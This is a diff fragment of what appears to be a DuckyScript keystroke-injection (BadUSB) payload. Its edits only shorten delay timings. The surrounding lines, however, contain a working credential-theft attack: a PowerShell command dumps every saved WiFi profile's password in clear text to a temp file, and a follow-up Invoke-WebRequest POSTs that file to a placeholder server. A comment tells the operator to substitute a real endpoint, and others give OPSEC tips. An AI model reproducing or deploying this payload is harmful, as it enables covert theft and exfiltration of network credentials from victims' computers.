@@ -10,7 +10,7 @@ DELAY 3000
 REM Extract and save all WiFi passwords to a temp file (OPSEC: use temp location)
 STRING (netsh wlan show profiles) | Select-String "Perfil" | ForEach-Object { $profile = $_.ToString().Split(":")[1].Trim(); netsh wlan show profile name="$profile" key=clear } > $env:TEMP\wifi_passwords.txt
 ENTER
-DELAY 6000
+DELAY 5000
 REM Exfiltrate WiFi passwords to server (change URL to your real endpoint)
 STRING Invoke-WebRequest -Uri "http://SERVER.COM/capture" -Method POST -InFile "$env:TEMP\wifi_passwords.txt" -ContentType "text/plain"
 ENTER
@@ -30,4 +30,4 @@ DELAY 2000
 REM Exit PowerShell session
 STRING exit
 ENTER
-DELAY 2700
+DELAY 2000
